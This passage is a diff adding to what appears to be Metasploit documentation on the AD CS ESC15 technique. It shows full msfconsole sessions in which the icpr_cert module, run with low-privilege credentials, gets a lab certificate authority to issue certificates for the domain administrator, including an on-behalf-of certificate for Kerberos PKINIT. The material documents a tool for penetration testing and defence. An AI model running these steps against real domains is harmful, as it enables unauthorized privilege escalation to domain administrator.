+ALT_SID => S-1-5-21-3402587289-1488798532-3618296993-1000
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.30.239.85
+
+[*] 172.30.239.85:445 - Requesting a certificate...
+[+] 172.30.239.85:445 - The requested certificate was issued.
+[*] 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
+[*] 172.30.239.85:445 - Certificate Policies:
+[*] 172.30.239.85:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
+[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009171337_default_172.30.239.85_windows.ad.cs_089081.pfx
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/icpr_cert) >
+```
+
+Certificates issued using this technique are not directly able to be used for Kerberos authentication via PKINIT.
+However, the attack can be modified by adding the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) to issue a
+certificate that can issue additional certificates in a manner similar to ESC2 which are compatible with PKINIT.
+
+```msf
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+RHOSTS => 172.30.239.85
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+SMBUser => normaluser
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+SMBDomain => COLLALABS1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+SMBPass => normalpass
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+CA => collalabs1-SRV-ADDS01-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
+CERT_TEMPLATE => ESC15-Test
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.4.1.311.20.2.1
+ADD_CERT_APP_POLICY => 1.3.6.1.4.1.311.20.2.1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.30.239.85
+
+[*] 172.30.239.85:445 - Requesting a certificate...
+[+] 172.30.239.85:445 - The requested certificate was issued.
+[*] 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
+[*] 172.30.239.85:445 - Certificate Policies:
+[*] 172.30.239.85:445 -   * 1.3.6.1.4.1.311.20.2.1 (Certificate Request Agent)
+[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/icpr_cert) >
+```
+
+Next, the certificate is used in conjunction with the `PFX` and `ON_BEHALF_OF` options to issue a certificate compatible
+with Kerberos as the privileged user (previously `ALT_UPN`).
+
+```
+msf6 auxiliary(admin/dcerpc/icpr_cert) > unset ADD_CERT_APP_POLICY 
+Unsetting ADD_CERT_APP_POLICY...
+msf6 auxiliary(admin/dcerpc/icpr_cert) > unset ALT_UPN 
+Unsetting ALT_UPN...
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+CERT_TEMPLATE => User
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF COLLALABS1\\administrator
+ON_BEHALF_OF => COLLALABS1\\administrator
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
+PFX => /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.30.239.85
+
+[*] 172.30.239.85:445 - Requesting a certificate...
+[+] 172.30.239.85:445 - The requested certificate was issued.
+[*] 172.30.239.85:445 - Certificate Email: administrator@collalabs1.local
+[*] 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
+[*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172817_default_172.30.239.85_windows.ad.cs_427087.pfx
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/dcerpc/icpr_cert) >
+```
+
+Finally, *this* certificate can be used to authenticate to Kerberos with the `kerberos/get_ticket` module.
 
 # Authenticating With A Certificate
 Metasploit supports authenticating with certificates in a couple of different ways. These techniques can be used to take
